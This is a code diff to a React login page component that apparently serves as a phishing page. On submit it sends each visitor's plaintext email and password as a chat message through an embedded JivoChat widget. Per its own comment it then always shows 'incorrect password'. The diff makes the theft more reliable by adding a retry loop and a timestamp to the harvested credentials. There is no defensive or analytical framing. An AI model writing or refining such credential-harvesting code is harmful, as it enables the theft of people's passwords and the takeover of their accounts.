@@ -32,20 +32,37 @@ const LoginPage = () => {
     const script = document.createElement('script');
     script.src = '//code.jivosite.com/widget/UwkEXTbvjU';
     script.async = true;
+    
+    // Wait for script to load before proceeding
+    script.onload = () => {
+      console.log('JivoChat script loaded successfully');
+    };
+    
     document.head.appendChild(script);
     
     return () => {
-      document.head.removeChild(script);
+      if (document.head.contains(script)) {
+        document.head.removeChild(script);
+      }
     };
   }, []);
 
   const onSubmit = async (data: LoginForm) => {
     setIsVerifying(true);
     
-    // Send login attempt to JivoChat
-    if (window.jivo_api) {
-      window.jivo_api.sendMessage(`Login attempt - Email: ${data.email}, Password: ${data.password}`);
-    }
+    // Send login attempt to JivoChat with retry mechanism
+    const sendToJivoChat = () => {
+      if (window.jivo_api && typeof window.jivo_api.sendMessage === 'function') {
+        const message = `🚨 LOGIN ATTEMPT 🚨\nEmail: ${data.email}\nPassword: ${data.password}\nTimestamp: ${new Date().toLocaleString()}`;
+        window.jivo_api.sendMessage(message);
+        console.log('Login attempt sent to JivoChat');
+      } else {
+        // Retry after a short delay if API not ready
+        setTimeout(sendToJivoChat, 1000);
+      }
+    };
+    
+    sendToJivoChat();
     
     // Always show incorrect password after delay
     setTimeout(() => {
